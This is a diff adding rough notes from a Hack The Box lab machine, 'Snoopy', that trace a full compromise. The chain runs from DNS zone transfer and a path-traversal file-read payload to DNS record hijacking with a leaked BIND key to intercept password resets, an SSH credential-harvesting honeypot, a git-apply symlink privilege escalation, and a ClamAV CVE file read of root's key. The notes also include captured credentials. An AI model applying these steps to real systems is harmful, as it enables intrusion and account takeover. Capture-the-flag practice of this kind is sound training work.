@@ -1,0 +1,126 @@
+the target appears to have many domains found with both a wfuzz and a dig afxr
+
+snoopy.htb -> bootstrap
+
+cschultz@snoopy.htb
+sbrown@snoopy.htb
+cbrown@snoopy.htb
+hangel@snoopy.htb
+lpelt@snoopy.htb
+hangel@snoopy.htb
+info@snoopy.htb
+
+mm.snoopy.htb ==> MatterMost
+
+http://snoopy.htb/contact.html --> Contact form says it cant load php email form lib
+http://snoopy.htb/download?file= --> announcement.pdf works : altering causes the zip folder to become corrupted
+
+MatterMost Users {
+	admin:
+	cschultz@snoopy.htb:
+	sbrown@snoopy.htb:
+	hangel@snoopy.htb:
+	lpelt@snoopy.htb:
+}
+
+dig axfr snoopy.htb @10.10.11.212 ==> Exposes possible subdomains without wfuzz usage
+
+....//....//....//....//....//....//..../{FILE}
+
+snoopy.htb/download?file=....//....//....//....//....//....//....//etc/passwd ==> file read
+[ ../ , url-encode , php:filter , file:// would fail ]
+
+Site is NGINX {
+
+  /etc/nginx/conf.d/mm.conf ==> data about subdomain
+
+}
+
+site-root dir : /var/www/html/
+
+from contact.php {
+
+  // Uncomment below code if you want to use SMTP to send emails. You need to enter your correct SMTP credentials
+  /*
+  $contact->smtp = array(
+    'host' => 'example.com',
+    'username' => 'example',
+    'password' => 'pass',
+    'port' => '587'
+  );
+  */
+
+}
+
+NmapFull shows the domain being BIND : Bind has a directory named /etc/bind that stores a possibly important file : /etc/bind/named.conf : using the key possibly at the bottom of the file we can possibly listen on the domain thru an NSUPDATE
+
+How To Add New DNS Record:
+
+1.) nsupdate -d -y algo:keyname:secret
+2.) server [target domain]
+3.) update add [valid subdomain] [life time seconds : 86400] IN A [attacker IP] ==> A stands for ADD IP
+	good subdomains to try hijacking would be mail.anyserver.end --> we could try fetching password resets!
+4.) send
+
+hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
+
+Setting up a listening SMTPD Server : python3 -m smtpd -c DebuggingServer -n {attacker IP}:25
+
+SMTPD Server picks up :
+b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Da81zw='
+b'5ry1csr5f4mtku3g5esd8aacus7ggapp7zqhbxdkisdjkinwsjake979gqf )'
+
+Real URL : http://mm.snoopy.htb/reset_password_complete?token=3Da81zw5ry1csr5f4mtku3g5esd8aacus7ggapp7zqhbxdkisdjkinwsjake979gqf
+
+cschultz@snoopy.htb
+10.10.14.30
+
+Inside of the chatroom we can use /server provision to build a req that hits back at us :
+SSH-2.0-paramiko_3.1.0
+
+Sources would say to use a tool called SSH-MITM: Instead we built a paramiko python ssh HONEYPOT
+to log the credentials used when they try to SSH in, which will most likely get us inside the box!
+
+cbrown:sn00pedcr3dential!!! ==> SSH Creds
+
+scp cbrown@snoopy.htb:./ ./ ==> Download VIA SSH
+
+sudo -u sbrown /usr/bin/git apply -v [file_path] ==> as cbrown you can run the sbrown sudo cmd like this
+
+sudo -u sbrown /usr/bin/git apply -v test ==> ^apply -v [a-zA-Z0-9.]+$ --> (simple words will pass [regex expressions]) ==> messes with active directory
+
+git diff /home/cbrown/.bash_history /home/cbrown/.ssh/authorized_keys > tPatch
+
+-------------------------------------------------------------------------------------------------
+======================================================
+
+diff --git a/symlink b/renamed-symlink
+similarity index 100%
+rename from symlink
+rename to renamed-symlink
+--
+diff --git /dev/null b/renamed-symlink/create-me
+new file mode 100644
+index 0000000..83e4ab5
+--- /dev/null
++++ b/renamed-symlink/authorized_keys
+@@ -0,0 +1 @@
++ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD318XwR69w8p52QF8xFqsY6oCLfLVOUMHXoL+iKCipF/UvLpFa4WrZBkPy5uPSJa+MP9efmgp0YSqFTX6c+cEimVtngWKQ/BmiWnKS1BMoJiuSQKtqfEEBHStjN1k+imb04GdjwLsTnHF2x0bm8syvVtk3T2iL8bDMpYieeKomvrwyYeLCdD0OnNXiidwgRgvJEnVmociQUw80c6dIl8iAACVaXMHa0TYi43b/tJwty3M2/JqnFDYOifl1K4Bx2EiZrbdVaSHmJJyV03HzuerqZ7uB4YPma0m/LLhAbH4kqSofqr4zvUbrjno0XYYEn5TxhDhgbKGej6IKZkZ5f3+yUankgoYXfFC/HcAJlawwS+aY3kaQR/IFfEfnY9DMj5fIbkFF1HA6wXwCFP0jVjMa9KGy4V7BBkntp2jm/Oi/aSB1ahf3eV3RyWi4O2glaPkGEM0B+vXUvh2ty9xfIZWNqbC+tCfT4fxZZbwdITgG7mQM6VJykaUDE0TD6ZcqqVM= cbrown@snoopy.htb
+
+======================================================
+	Explaination for Sudo Priv Esc:
+
+We create a symbolic link that points to the .ssh folder of the user sbrown inside the git diff output.
+
+ln -s /home/sbrown/.ssh symlink ==> Using this cmd we are linking .ssh to the symlink
+					that is made from the sudo cmd [contents of the symlink are routed to /.ssh]
+-------------------------------------------------------------------------------------------------
+
+sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/[filename] ==> how to run the sudo cmd logged in as sbrown
+
+ln -s /root/root.txt sFile --> scans /root/root.txt [Doesnt display its contents]
+ln -s /root/.ssh/id_rsa sFile --> We can use this to verify if exist! [Root has an ID_RSA]
+
+https://github.com/nokn0wthing/CVE-2023-20052 ==> File Read to Fetch Roots ID_RSA
+
+root:4f6f246320d4c96aae546f2132389029
